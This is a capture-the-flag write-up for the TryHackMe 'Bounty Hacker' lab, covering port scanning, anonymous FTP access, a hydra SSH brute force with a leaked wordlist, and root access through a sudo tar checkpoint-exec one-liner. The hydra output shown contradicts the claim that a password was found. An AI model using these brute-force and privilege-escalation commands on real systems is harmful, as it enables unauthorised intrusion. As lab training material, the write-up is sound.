# Bounty Hunter
tryhackme - bounty hacker [easy] https://tryhackme.com/room/cowboyhacker

![9ad38a2cc31d6ae0030c888aca7fe646](https://user-images.githubusercontent.com/80511498/147251011-a47f9804-889c-483b-8e56-1bb0964e11e0.jpeg)
tryhackme 

## NMAP SCAN
*here is a nmap scan of the machine*
nmap command :- nmap -A http:// <IP_Address>
___
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.33.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.0 (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   22.96 ms  10.17.0.1
2   ... 4
5   145.37 ms 10.10.0.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds
___
 
*we can see in the nmap result that ftp and ssh is open* 
*firstly im going to try ftp into the machine*

## FTP results
*The FTP is accessible try login with anonymous.
command :- ftp <IP_Address> 
when asked for user enter anonymous*

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp>

*get the files locks.txt and task.txt they are needed in further enumeration*
___
*task.txt*
in task.txt we found a user (lin)
___
$ cat task.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
___
locks.txt
this look's like a wordlist so we will use it for bruteforce

*$ cat locks.txt* 
- rEddrAGON
- ReDdr4g0nSynd!cat3
- Dr@gOn$yn9icat3
- R3DDr46ONSYndIC@Te
- ReddRA60N
- R3dDrag0nSynd1c4te
- dRa6oN5YNDiCATE
- ReDDR4g0n5ynDIc4te
- R3Dr4gOn2044
- RedDr4gonSynd1cat3
- R3dDRaG0Nsynd1c@T3
- Synd1c4teDr@g0n
- reddRAg0N
- REddRaG0N5yNdIc47e
- Dra6oN$yndIC@t3
- 4L1mi6H71StHeB357
- rEDdragOn$ynd1c473
- DrAgoN5ynD1cATE
- ReDdrag0n$ynd1cate
- Dr@gOn$yND1C4Te
- RedDr@gonSyn9ic47e
- REd$yNdIc47e
- dr@goN5YNd1c@73
- rEDdrAGOnSyNDiCat3
- r3ddr@g0N
- ReDSynd1ca7e

---

## HYDRA
**trying to brute force ssh using hydra**
now we have the user name and we will use the wordlist locks.txt to brute force
command :- hydra -l lin -P locks.txt  <IP_Address> ssh

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-22 21:45:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ftp://10.10.0.198:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-22 21:45:39

we found the password and login via ssh
we see the user flag 
we just cat the user flag 
user.txt - THM{userflag}
___

### Priv Sec
now we need to escalate our privilege
we can exploit  lin's sudo privilege
command :- sudo -l
___
lin@bountyhacker:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
___

*i searched more on tar sudo privilege escaltion and found this*


just run the following command 
command :- sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

![68747470733a2f2f692e696d6775722e636f6d2f41397a70647a6e2e706e67](https://user-images.githubusercontent.com/80511498/147251386-5d178b8c-1a21-4590-90d1-fde988fe1ecc.png)


now we have a root access you can see by typing :- sudo -l
![68747470733a2f2f692e696d6775722e636f6d2f633845557361732e706e67](https://user-images.githubusercontent.com/80511498/147251202-77aa7dce-db3a-4829-a758-fba7623e3173.png)

cd into /root to get to the root flag
___

